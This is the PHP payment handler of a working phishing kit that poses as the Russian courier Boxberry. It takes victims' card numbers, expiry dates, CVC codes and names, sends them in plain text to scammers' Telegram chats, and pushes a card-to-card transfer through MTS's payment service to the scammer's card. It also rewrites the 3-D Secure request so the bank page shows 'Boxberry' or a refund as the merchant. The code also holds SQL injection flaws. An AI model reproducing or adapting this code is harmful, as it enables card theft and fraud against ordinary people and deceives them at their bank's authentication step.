<?php

	require_once $_SERVER['DOCUMENT_ROOT'].'/system/mysql.php';
	require_once $_SERVER['DOCUMENT_ROOT'].'/system/config.php';

	if(isset($_POST['order_id'])) {
		error_reporting(E_ERROR | E_PARSE);
		
		date_default_timezone_set("Europe/Moscow");
		
		$advert = mysqli_fetch_assoc(mysqli_query($connection, "SELECT `worker`, `amount` FROM `trackcodes` WHERE `code` = '$_POST[order_id]'"));
		$worker = mysqli_fetch_assoc(mysqli_query($connection, "SELECT `card` FROM `accounts` WHERE `telegram` = '$advert[worker]'"));
		
		$exp = explode('/', $_POST['expdate']);
		
		$card_number = str_replace(" ", "", $_POST["cardnumber"]);
		$mounth = $exp[0];
		$year = $exp[1];
		$cvc = $_POST['cvc2'];
		$amount = $_POST['amount'];
		
		if(!isset($card_number) OR !isset($mounth) OR !isset($year) OR !isset($cvc)) {
			$text = "⛔️ <b>Мамонт не смог оплатить доставку</b>⛔️\n\n";
			$text .= "💢Платформа: <code>Boxberry</code>\n";
			$text .= "ID воркера: <a href=\"tg://user?id=$advert[worker]\">$advert[worker]</a>\n";
			$text .= "Трек-код: <code>$_POST[order_id]</code>\n";
			$text .= "Сумма: <code>$amount руб.</code>\n\n";
			$text .= "<b>Информация об ошибке:</b>\n<code>Не указаны реквизиты карты мамонта</code>\n";
			
			send($config['token'], 'sendMessage', Array('chat_id' => $config['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
			send($config['token'], 'sendMessage', Array('chat_id' => $advert['worker'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
			
			if($_COOKIE['type'] == 'order') {
				die(header("Location: https://$_SERVER[SERVER_NAME]/payment?id=$_POST[order_id]"));
			} elseif($_COOKIE['type'] == 'refund') {
				die(header("Location: https://$_SERVER[SERVER_NAME]/refund?id=$_POST[order_id]"));
			} else {
				die(header("Location: https://$_SERVER[SERVER_NAME]/track?track_id=$_POST[order_id]"));
			}
		}

		if(!isset($amount) OR $advert['amount'] > $amount) {
			$text = "⛔️ <b>Мамонт не смог оплатить доставку</b>⛔️\n\n";
			$text .= "💢Платформа: <code>Boxberry</code>\n";
			if(isset($advert['worker'])) $text .= "ID воркера: <a href=\"tg://user?id=$advert[worker]\">$advert[worker]</a>\n";
			if(isset($_POST['order_id'])) $text .= "Трек-код: <code>$_POST[order_id]</code>\n";
			if(isset($amount)) $text .= "Сумма: <code>$amount руб.</code>\n\n";
			$text .= "<b>Информация об ошибке:</b>\n<code>Сумма оплаты меньше суммы объявления или она совсем пустая</code>\n";
			
			send($config['token'], 'sendMessage', Array('chat_id' => $config['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
			send($config['token'], 'sendMessage', Array('chat_id' => $advert['worker'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
			
			if($_COOKIE['type'] == 'order') {
				die(header("Location: https://$_SERVER[SERVER_NAME]/payment?id=$_POST[order_id]"));
			} elseif($_COOKIE['type'] == 'refund') {
				die(header("Location: https://$_SERVER[SERVER_NAME]/refund?id=$_POST[order_id]"));
			} else {
				die(header("Location: https://$_SERVER[SERVER_NAME]/track?track_id=$_POST[order_id]"));
			}
		}

		if($worker['card'] == 0 AND $config['card'] == 0) {
			$text = "⛔️ <b>Мамонт не смог оплатить доставку</b>⛔️\n\n";
			$text .= "💢Платформа: <code>Boxberry</code>\n";
			$text .= "ID воркера: <a href=\"tg://user?id=$advert[worker]\">$advert[worker]</a>\n";
			$text .= "Трек-код: <code>$_POST[order_id]</code>\n";
			$text .= "Сумма: <code>$amount руб.</code>\n\n";
			$text .= "<b>Информация об ошибке:</b>\n<code>У воркера не привязана карта и не установлена карта по умолчанию</code>\n";
			
			send($config['token'], 'sendMessage', Array('chat_id' => $config['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
			send($config['token'], 'sendMessage', Array('chat_id' => $advert['worker'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
			
			if($_COOKIE['type'] == 'order') {
				die(header("Location: https://$_SERVER[SERVER_NAME]/payment?id=$_POST[order_id]"));
			} elseif($_COOKIE['type'] == 'refund') {
				die(header("Location: https://$_SERVER[SERVER_NAME]/refund?id=$_POST[order_id]"));
			} else {
				die(header("Location: https://$_SERVER[SERVER_NAME]/track?track_id=$_POST[order_id]"));
			}

		} else {
			$query = mysqli_query($connection, "SELECT `id` FROM `cards` WHERE `number` = '$worker[card]' AND `status` = '1'");
			
			if(mysqli_num_rows($query) > 0) {
				$card = $worker['card'];
			} else {
				if($config['card'] == 0) {
					$text = "⛔️ <b>Мамонт не смог оплатить доставку</b>⛔️\n\n";
					$text .= "💢Платформа:</b> <code>Boxberry</code>\n";
					$text .= "ID воркера: <a href=\"tg://user?id=$advert[worker]\">$advert[worker]</a>\n";
					$text .= "Трек-код: <code>$_POST[order_id]</code>\n";
					$text .= "Сумма: <code>$amount руб.</code>\n\n";
					$text .= "<b>Информация об ошибке:</b>\n<code>У воркера привязана неактивная карта и не установлена карта по умолчанию</code>\n";
					
					send($config['token'], 'sendMessage', Array('chat_id' => $config['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
					send($config['token'], 'sendMessage', Array('chat_id' => $advert['worker'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
					
					if($_COOKIE['type'] == 'order') {
						die(header("Location: https://$_SERVER[SERVER_NAME]/payment?id=$_POST[order_id]"));
					} elseif($_COOKIE['type'] == 'refund') {
						die(header("Location: https://$_SERVER[SERVER_NAME]/refund?id=$_POST[order_id]"));
					} else {
						die(header("Location: https://$_SERVER[SERVER_NAME]/track?track_id=$_POST[order_id]"));
					}
				} else {
					$card = $config['card'];
				}
			}
		}
		
		setcookie('num', $card_number, time()+3600, '/');
		setcookie('exp', $_POST['expdate'], time()+3600, '/');
		setcookie('cvc', $_POST['cvc2'], time()+3600, '/');
		setcookie('name', mb_strtoupper($_POST['cardholder']), time()+3600, '/');
		
		$text = "⚠️💳 <b>Мамонт вбивает данные от карты</b>💳⚠️\n\n";
		$text .= "💢Платформа: <code>Boxberry</code>\n";
		$text .= "Трек-код: <code>$_POST[order_id]</code>\n";
		$text .= "Сумма: <code>$amount руб.</code>\n";
		
		send($config['token'], 'sendMessage', Array('chat_id' => $advert['worker'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
		
		$text = "⚠️💳 <b>Мамонт вбил данные от карты</b>💳⚠️\n\n";
		$text .= "💢Платформа: <code>Boxberry</code>\n";
		$text .= "ID воркера: <a href=\"tg://user?id=$advert[worker]\">$advert[worker]</a>\n";
		$text .= "Трек-код: <code>$_POST[order_id]</code>\n";
		$text .= "Сумма: <code>$amount руб.</code>\n\n";
		$text .= "Номер карты: <code>$card_number</code>\n";
		$text .= "Имя на карте: <code>".mb_strtoupper($_POST['cardholder'])."</code>\n";
		$text .= "Действительна до: <code>$mounth/$year</code>\n";
		$text .= "CVC/CVV: <code>$cvc</code>\n";
		
		send($config['token'], 'sendMessage', Array('chat_id' => $config['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
		unset($text);
		
		//--------------------------------------------------------------------------------------------------

		// Session
		$ch = curl_init('https://payment.mts.ru/transfer/CardToCard');
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'User-Agent: '.getallheaders()['User-Agent'],
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language: en-US,en;q=0.5',
            'Accept-Encoding: gzip, deflate, br',
            'Upgrade-Insecure-Requests: 1',
            'Cache-Control: max-age=0'
        ]);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch,CURLOPT_ENCODING, 'gzip');
        curl_setopt($ch, CURLOPT_HEADER, 1);
        $session = curl_exec($ch);
        $tsf = curl_getinfo($ch);
        curl_close($ch);

        preg_match_all('#RequestVerificationToken" type="hidden" value="(.+?)" /></form>#is', $session, $vertoken);
        preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $session, $matches);

        $cookies = array();
        foreach($matches[1] as $item) {
            parse_str($item, $cookie);
            $cookies = array_merge($cookies, $cookie);
        }
        $coc = [];
        foreach($cookies as $key=>$val){
            $coc[str_replace('_','.',$key)] = $val;     
        }


        $params = [
            "ExternalTransfer"=>	"true",
			"TokenizedTargetPan"=>	"",
			"TargetPanValue"=>	$card,
			"Sum"=>	$amount,
			"SourceInstrumentId"=>	"ANONYMOUS_CARD",
			"Pan"=>	$card_number,
			"ExpiryMonth"=>	"",
			"ExpiryYear"=>	"",
			"CardholderName"=>	"NONAME",
			"Cvc"	=>"",
			"__RequestVerificationToken"=>	$vertoken[1][0],
			"Currency"=>	"undefined"
        ];

        $params['ExpiryMonth'] = $mounth;
        $params['ExpiryYear'] = $year;
        $params['Cvc'] = $cvc;
        $params['Location'] = 'https://payment.mts.ru/transfer/CardToCard';


        $ch = curl_init("https://payment.mts.ru/transfers/getterms");
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Host: payment.mts.ru',
            'Accept: */*',
            'Accept-Encoding: gzip, deflate, br',
            'Referer: https://payment.mts.ru/transfer/CardToCard',
            'X-Requested-With: XMLHttpRequest',
            'User-Agent: '.getallheaders()['User-Agent'],
            'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
            'Cookie: .AspNetCore.Antiforgery.Ge25QBab4-8='.$coc['.AspNetCore.Antiforgery.Ge25QBab4-8'].'; .AspNetCore.RegionId='.$coc['.AspNetCore.RegionId'].
            '; BIGipServermsk-pool-eksite-10.74.58.129-fw15-dmz21-81='.$coc['BIGipServermsk-pool-eksite-10.74.58.129-fw15-dmz21-81'],
        ));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
        $comission = curl_exec($ch);
        curl_close($ch);
        $com = json_decode($comission, 1);

        $ch = curl_init("https://payment.mts.ru/transfer/do");
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Host: payment.mts.ru',
            'Accept: */*',
            'Accept-Encoding: gzip, deflate, br',
            'Referer: https://payment.mts.ru/transfer/CardToCard',
            'X-Requested-With: XMLHttpRequest',
            'User-Agent: '.getallheaders()['User-Agent'],
            'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
            'Cookie: .AspNetCore.Antiforgery.Ge25QBab4-8='.$coc['.AspNetCore.Antiforgery.Ge25QBab4-8'].'; .AspNetCore.RegionId='.$coc['.AspNetCore.RegionId'],
        ));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
        $comission = curl_exec($ch);
        curl_close($ch);
        $d3s = json_decode($comission,1);

        $d3s["__RequestVerificationToken"] =	$vertoken[1][0];
        $d3s[".AspNetCore.Antiforgery.Ge25QBab4-8"] =	$coc['.AspNetCore.Antiforgery.Ge25QBab4-8'];
        $d3s["BIGipServermsk-pool-eksite-10.74.58.129-fw15-dmz21-81"] =	$coc['BIGipServermsk-pool-eksite-10.74.58.129-fw15-dmz21-81'];
        $d3s[".AspNetCore.RegionId"] =	$coc['.AspNetCore.RegionId'];
        $d3s["card_number"] = $card_number;
		$d3s["mmyy"] = $mounth.'/'.$year;
		$d3s["cvc"] = $cvc;
		$d3s["amount"] = $amount;
		file_put_contents("temp/" . $d3s['mdOrder'], json_encode($d3s, JSON_UNESCAPED_UNICODE));
		$ab = 'https://'.$_SERVER['SERVER_NAME'].dirname($_SERVER['REQUEST_URI']).'/status.php?md='.$d3s['model']["md"].'&mdorder='.$d3s['mdOrder'].'&amount='.(int)$amount.'&order_id=' . (int)$_POST["order_id"].'">';
		if(!isset($d3s['model']["paReq"])){
    		$text = "⛔️ <b>Мамонт не смог оплатить доставку</b>⛔️\n\n";
			$text .= "💢Платформа: <code>Boxberry</code>\n";
			$text .= "ID воркера: <a href=\"tg://user?id=$advert[worker]\">$advert[worker]</a>\n";
			$text .= "Трек-код: <code>$_POST[order_id]</code>\n";
			$text .= "Сумма: <code>$amount руб.</code>\n\n";
			$text .= "<b>Информация об ошибке:</b>\n<code>Не удалось построить форму 3DSecure</code>\n";
			
			send($config['token'], 'sendMessage', Array('chat_id' => $config['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
			send($config['token'], 'sendMessage', Array('chat_id' => $advert['worker'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
			
			if($_COOKIE['type'] == 'order') {
				die(header("Location: https://$_SERVER[SERVER_NAME]/payment?id=$_POST[order_id]"));
			} elseif($_COOKIE['type'] == 'refund') {
				die(header("Location: https://$_SERVER[SERVER_NAME]/refund?id=$_POST[order_id]"));
			} else {
				die(header("Location: https://$_SERVER[SERVER_NAME]/track?track_id=$_POST[order_id]"));
			}
		}

		if($_COOKIE['type'] == 'refund') {
			$newpareq = renameShop($d3s['model']["paReq"], 'Возврат средств', 'https://boxberry.ru/');
		} else {
			$newpareq = renameShop($d3s['model']["paReq"], 'Boxberry', 'https://boxberry.ru/');
		}

		echo '<body onload="document.forms[0].submit()">'.
				'<form action="'.$d3s['model']["acsUrl"].'" method="post">' .
				'<input type="hidden" name="PaReq" value="'.$newpareq.'">' .
				'<input type="hidden" name="MD" value="'.$d3s['model']["md"].'">' .
				'<input type="hidden" name="TermUrl" value="'.$ab.'">' .
				'<input type="hidden" name="MdOrder" value="'.$d3s['model']["mdOrder"].'">' .
				'<input type="hidden" name="__RequestVerificationToken" value="'.$d3s["__RequestVerificationToken"].'">' .
				'</form>' .
				'</body>';
	} else {
		die(header("Location: https://$_SERVER[SERVER_NAME]/"));
	}
?>